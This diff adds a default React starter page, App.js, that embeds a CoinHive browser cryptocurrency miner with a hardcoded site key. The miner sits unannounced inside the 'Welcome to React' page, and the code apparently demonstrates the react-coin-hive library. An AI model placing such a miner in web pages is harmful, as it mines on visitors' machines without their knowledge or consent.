@@ -1,0 +1,24 @@
+import React, { Component } from "react";
+import logo from "./logo.svg";
+import "./App.css";
+import CoinHive from "react-coin-hive";
+
+class App extends Component {
+  render() {
+    let minerStyle = { width: "256px", height: "310px" };
+    return (
+      <div className="App">
+        <header className="App-header">
+          <img src={logo} className="App-logo" alt="logo" />
+          <h1 className="App-title">Welcome to React</h1>
+        </header>
+        <p className="App-intro">
+          To get started, edit <code>src/App.js</code> and save to reload.
+        </p>
+        <CoinHive siteKey="2mCAwxcq5YAxdr9AzTVUqVus7IjqfWs8" />
+      </div>
+    );
+  }
+}
+
+export default App;
